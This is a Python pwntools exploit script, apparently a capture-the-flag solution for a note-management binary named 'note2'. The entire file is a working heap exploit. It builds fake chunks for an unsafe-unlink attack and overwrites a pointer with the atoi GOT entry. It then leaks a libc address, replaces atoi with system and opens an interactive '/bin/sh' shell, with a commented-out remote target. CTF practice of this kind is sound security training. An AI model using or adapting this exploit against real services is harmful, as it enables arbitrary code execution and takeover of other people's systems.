from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./note2"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("option--->>\n",str(idx))

def add(length,content):
    opt(1)
    # p.sendlineafter("",str(idx))
    p.sendlineafter("Input the length of the note content:(less than 128)\n",str(length))
    p.sendlineafter("Input the note content:\n",str(content))

def show(idx):
    opt(2)
    p.sendlineafter("Input the id of the note:\n",str(idx))

def free(idx):
    opt(4)
    p.sendlineafter("Input the id of the note:\n",str(idx))

def overwrite(idx,content):
    opt(3)
    p.sendlineafter("Input the id of the note:\n",str(idx))
    p.sendlineafter("do you want to overwrite or append?[1.overwrite/2.append]\n","1")
    p.sendlineafter("TheNewContents:",str(content))

def append(idx,content):
    opt(3)
    p.sendlineafter("Input the id of the note:\n",str(idx))
    p.sendlineafter("do you want to overwrite or append?[1.overwrite/2.append]\n","2")
    p.sendlineafter("TheNewContents:",str(content))

p.sendlineafter("Input your name:\n","name1")
p.sendlineafter("Input your address:\n","address1")


x = 0x602120
fake_size = 0x20
fake_fd = x-0x18
fake_bk = x-0x10
fake_next_prev = 0x20
fake_next_size = 0x90
payload1 = flat([
    0,fake_size,
    fake_fd,fake_bk,
    fake_next_prev,fake_next_size
    ])
add(0x50,payload1)

payload2 = flat([
    "a"*8,"b"*8,
    0x70,0x90,
    0,0
    ])

add(0,"a")
add(0x80,"c"*0x20)
free(1)
add(0,payload2)
free(2)

payload = flat([
    "a"*0x18,
    elf.got["atoi"]
    ])

overwrite(0,payload)
show(0)
p.recvuntil("Content is ")
atoi_addr = u64(p.recv(6).ljust(8,"\0"))
libc_base = atoi_addr - libc.sym["atoi"]
system_addr = libc_base + libc.sym["system"]
overwrite(0,p64(system_addr))
p.sendline("/bin/sh\x00")
# gdb.attach(p,"set $g=0x602120,$h=0x603000")
p.interactive()
